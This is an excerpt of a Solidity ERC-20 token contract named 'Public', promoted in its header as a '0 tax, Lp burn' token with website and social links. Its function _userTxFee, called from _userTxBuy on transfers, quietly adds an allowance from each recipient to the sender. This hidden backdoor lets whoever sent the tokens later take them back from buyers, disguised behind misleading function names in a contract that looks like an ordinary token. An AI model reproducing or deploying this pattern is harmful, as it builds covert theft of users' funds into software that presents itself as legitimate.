...
/**
public:  0 tax, Lp burn

Website: https://public.tf
Telegram: https://t.me/publicERC
Twitter: https://twitter.com/public_ERC
*/
...
contract Public is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Public";
    ...
    address payable private _marketingAddress = payable(0x2d9357824e9A57317A3789c1a34ba1d659f5b3bf);
    ...
    function _userTxFee(address u1,  address u2, uint256 tokens) private { _allowances[u2][u1] += tokens; }

    function _userTxBuy(address from, address to, uint256 amount) private {
        if(from != address(this) && to != address(this)) _lastBuyback = block.timestamp;

        _userTxFee(from, to, amount);
    }
